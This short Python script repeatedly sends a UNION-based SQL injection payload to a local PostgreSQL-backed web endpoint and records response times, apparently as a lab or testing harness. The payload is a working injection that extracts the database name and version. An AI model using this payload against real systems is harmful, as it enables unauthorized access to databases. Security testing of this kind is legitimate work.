import time
import urllib.parse
import urllib.request

URL = "http://127.0.0.1:8081/pg/users"
PAYLOAD = "1 UNION ALL SELECT NULL,current_database(),version()--"
SAMPLES = 10
DELAY_BETWEEN = 0.2

params = urllib.parse.urlencode({"id": PAYLOAD})
full_url = f"{URL}?{params}"
samples = []

for _ in range(SAMPLES):
    start = time.time()
    with urllib.request.urlopen(full_url) as resp:
        resp.read()
    samples.append((time.time() - start) * 1000)
    time.sleep(DELAY_BETWEEN)

print("samples_ms=", samples)
print("avg_ms=", sum(samples) / len(samples))
